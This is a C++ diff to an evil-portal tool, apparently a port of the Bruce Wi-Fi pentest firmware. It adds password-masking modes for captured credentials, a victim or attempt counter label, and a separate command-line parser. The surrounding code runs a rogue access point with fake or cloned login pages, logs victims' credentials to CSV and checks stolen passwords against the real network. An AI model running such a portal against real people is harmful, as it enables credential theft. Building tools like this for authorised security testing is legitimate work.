@@ -324,6 +324,18 @@ std::string last_cred_text(const std::vector<std::pair<std::string, std::string>
     return out;
 }
 
+const char* pwd_mode_label(PwdMode mode) {
+    switch (mode) {
+        case PwdMode::Full: return "Full";
+        case PwdMode::FirstLast: return "p******d";
+        case PwdMode::Hidden: return "*hidden*";
+        case PwdMode::Length: return "Length only";
+    }
+    return "Full";
+}
+
+const char* counter_label(bool verify_mode) { return verify_mode ? "Attempt" : "Victims"; }
+
 std::string parse_ap_tag(const std::string& html) {
     // loadCustomHtml(): read the first line, extract <!-- AP="Name" -->.
     const size_t nl = html.find('\n');
@@ -760,6 +772,34 @@ std::string arg_value(const HttpRequest& req, const std::string& key) {
     return "";
 }
 
+// Bruce's credsController masks the "password" value once, then uses that
+// masked copy for htmlResponse, csvLine and lastCred. Only the password field
+// is touched; every other arg (and the argument order) is preserved. Byte-wise,
+// like Arduino's String (the ESP32 masking is not UTF-8 aware either).
+std::vector<std::pair<std::string, std::string>> mask_pwd_args(
+    const std::vector<std::pair<std::string, std::string>>& args, PwdMode mode) {
+    std::vector<std::pair<std::string, std::string>> out = args;
+    for (auto& kv : out) {
+        if (kv.first != "password") continue;
+        std::string& value = kv.second;
+        switch (mode) {
+            case PwdMode::Full:
+                break;
+            case PwdMode::FirstLast:
+                // length > 2 only; a 0/1/2-char password stays verbatim.
+                for (std::size_t i = 1; i + 1 < value.size(); ++i) value[i] = '*';
+                break;
+            case PwdMode::Hidden:
+                value = "*hidden*";
+                break;
+            case PwdMode::Length:
+                value = std::to_string(value.size()) + " chars";
+                break;
+        }
+    }
+    return out;
+}
+
 } // namespace
 
 HttpResponse portal_handle_request(const HttpRequest& req, PortalOptions& opts, PortalState& state,
@@ -774,8 +814,12 @@ HttpResponse portal_handle_request(const HttpRequest& req, PortalOptions& opts, 
     // other URL becomes a capture when it carries args, else the portal.
     if (path == "/post") {
         const std::string password = arg_value(req, "password");
-        state.captured_html = captured_li(req.args) + state.captured_html;
-        state.last_cred = last_cred_text(req.args);
+        // Bruce masks the password value once and uses the masked copy for
+        // every capture output (html list, CSV line, lastCred); the network
+        // check above still gets the RAW password.
+        const auto capture_args = mask_pwd_args(req.args, opts.pwd_mode);
+        state.captured_html = captured_li(capture_args) + state.captured_html;
+        state.last_cred = last_cred_text(capture_args);
         state.victims++;
 
         if (opts.verify_mode && !password.empty()) {
@@ -783,10 +827,10 @@ HttpResponse portal_handle_request(const HttpRequest& req, PortalOptions& opts, 
             // stolen password against the real network and log valid true/false.
             const bool valid = hooks.verify_password ? hooks.verify_password(opts, password) : false;
             save_csv(opts, opts.ap_name + "_creds.csv",
-                     csv_line(req.args) + (valid ? ", valid: true" : ", valid: false"));
+                     csv_line(capture_args) + (valid ? ", valid: true" : ", valid: false"));
             return make_html(wifi_load_html());
         }
-        save_csv(opts, opts.output_file, csv_line(req.args));
+        save_csv(opts, opts.output_file, csv_line(capture_args));
         return make_html(wifi_load_html());
     }
 
@@ -1037,6 +1081,15 @@ int parse_int(const char* s, int fallback) {
     return (end && *end == '\0') ? static_cast<int>(v) : fallback;
 }
 
+// --pwd-mode value -> Bruce's EvilPortalPasswordMode. Exact spellings only.
+bool parse_pwd_mode(const std::string& value, PwdMode& out) {
+    if (value == "full") { out = PwdMode::Full; return true; }
+    if (value == "first_last") { out = PwdMode::FirstLast; return true; }
+    if (value == "hidden") { out = PwdMode::Hidden; return true; }
+    if (value == "length") { out = PwdMode::Length; return true; }
+    return false;
+}
+
 void usage() {
     std::printf("usage: bruce_cardputerzero --evil-portal <mode> [args...]\n"
                 "  default [ssid]         Google portal AP (Bruce 'Default')\n"
@@ -1045,7 +1098,8 @@ void usage() {
                 "                         <!-- AP=\"Name\" --> names the AP\n"
                 "  clone   <ssid> [chan]  clone a scanned AP ('Clone Portal')\n"
                 "options: --gateway IP (default 192.168.4.1) --iface DEV --channel N\n"
-                "         --country CC (2-letter regdom; else read from `iw reg get`)\n");
+                "         --country CC (2-letter regdom; else read from `iw reg get`)\n"
+                "         --pwd-mode MASK (full|first_last|hidden|length; default full)\n");
 }
 
 int serve_portal(PortalOptions opts, const std::string& iface) {
@@ -1286,7 +1340,8 @@ int serve_portal(PortalOptions opts, const std::string& iface) {
     std::printf("AP: '%s' (channel %d on %s)\n", opts.ap_name.c_str(), opts.channel, iface.c_str());
     std::printf("-> http://%s/creds\n", opts.gateway.c_str());
     std::printf("-> http://%s/ssid\n", opts.gateway.c_str());
-    std::printf("Victims: 0\n");
+    std::printf("%s: 0\n", counter_label(opts.verify_mode));
+    std::printf("Pwd mode: %s\n", pwd_mode_label(opts.pwd_mode));
     std::printf("captures -> %s\n", creds_path.c_str());
     std::printf("Back / Ctrl-C to stop.\n\n");
     std::fflush(stdout);
@@ -1336,11 +1391,11 @@ int serve_portal(PortalOptions opts, const std::string& iface) {
         if (state.victims == before + 1) {
             std::printf("[victim #%d] %s", state.victims,
                         state.last_cred.empty() ? "(empty submission)\n" : state.last_cred.c_str());
-            std::printf("Victims: %d\n\n", state.victims);
+            std::printf("%s: %d\n\n", counter_label(opts.verify_mode), state.victims);
             std::fflush(stdout);
         } else if (req.path == "/postssid" && !arg_value(req, "ssid").empty()) {
             // Counter reset by the SSID change; the hook already announced it.
-            std::printf("Victims: %d\n\n", state.victims);
+            std::printf("%s: %d\n\n", counter_label(opts.verify_mode), state.victims);
             std::fflush(stdout);
         }
     }
@@ -1846,6 +1901,54 @@ bool PortalNet::teardown(int attempts) {
     return clean;
 }
 
+PortalCli parse_portal_cli(int argc, char** argv, const std::string& default_iface) {
+    PortalCli cli;
+    cli.iface = default_iface;
+    for (int i = 0; i < argc; ++i) {
+        const std::string a = argv[i] ? argv[i] : "";
+        if (a == "--gateway" && i + 1 < argc) {
+            cli.opts.gateway = argv[++i];
+        } else if (a == "--iface" && i + 1 < argc) {
+            cli.iface = argv[++i];
+        } else if (a == "--channel" && i + 1 < argc) {
+            cli.opts.channel = parse_int(argv[++i], cli.opts.channel);
+        } else if (a == "--country" && i + 1 < argc) {
+            const std::string cc = argv[++i];
+            if (!valid_country(cc)) {
+                // Same message/exit as before: error only, no usage.
+                cli.ok = false;
+                cli.error = "--country must be a 2-letter code (e.g. US, JP)";
+                return cli;
+            }
+            cli.opts.country = cc; // resolve_country uppercases/re-validates
+        } else if (a == "--pwd-mode") {
+            // Must consume its value, or it would leak into `pos` (the SSID /
+            // custom HTML path / clone channel positional).
+            if (i + 1 >= argc) {
+                cli.ok = false;
+                cli.show_usage = true;
+                cli.error = "--pwd-mode needs a value (full|first_last|hidden|length)";
+                return cli;
+            }
+            const std::string value = argv[++i];
+            if (!parse_pwd_mode(value, cli.opts.pwd_mode)) {
+                cli.ok = false;
+                cli.show_usage = true;
+                cli.error = "--pwd-mode must be full, first_last, hidden or length";
+                return cli;
+            }
+        } else if (a.rfind("--", 0) == 0) {
+            cli.ok = false;
+            cli.show_usage = true;
+            cli.error = "unknown option " + a;
+            return cli;
+        } else {
+            cli.pos.push_back(a);
+        }
+    }
+    return cli;
+}
+
 int evil_portal_main(int argc, char** argv) {
     if (argc < 1 || !argv[0] || !argv[0][0]) {
         usage();
@@ -1853,36 +1956,19 @@ int evil_portal_main(int argc, char** argv) {
     }
     const std::string mode = argv[0];
 
-    PortalOptions opts;
+    PortalCli cli = parse_portal_cli(argc - 1, argv + 1, autodetect_iface());
+    if (!cli.ok) {
+        std::printf("error: %s\n", cli.error.c_str());
+        if (cli.show_usage) usage();
+        return 1;
+    }
+    PortalOptions opts = std::move(cli.opts);
     opts.html_page = default_portal_html();
     opts.creds_dir = home_dir() + "/.bruce";
-    std::string iface = autodetect_iface();
+    std::string iface = std::move(cli.iface);
+    std::vector<std::string> pos = std::move(cli.pos);
     std::string custom_file;
 
-    std::vector<std::string> pos;
-    for (int i = 1; i < argc; ++i) {
-        const std::string a = argv[i] ? argv[i] : "";
-        if (a == "--gateway" && i + 1 < argc) {
-            opts.gateway = argv[++i];
-        } else if (a == "--iface" && i + 1 < argc) {
-            iface = argv[++i];
-        } else if (a == "--channel" && i + 1 < argc) {
-            opts.channel = parse_int(argv[++i], opts.channel);
-        } else if (a == "--country" && i + 1 < argc) {
-            const std::string cc = argv[++i];
-            if (!valid_country(cc)) {
-                std::printf("error: --country must be a 2-letter code (e.g. US, JP)\n");
-                return 1;
-            }
-            opts.country = cc; // resolve_country uppercases/re-validates
-        } else if (a.rfind("--", 0) == 0) {
-            std::printf("error: unknown option %s\n", a.c_str());
-            usage();
-            return 1;
-        } else {
-            pos.push_back(a);
-        }
-    }
     if (!valid_iface(iface) || !valid_ip(opts.gateway)) {
         std::printf("error: bad interface '%s' or gateway '%s'\n", iface.c_str(),
                     opts.gateway.c_str());
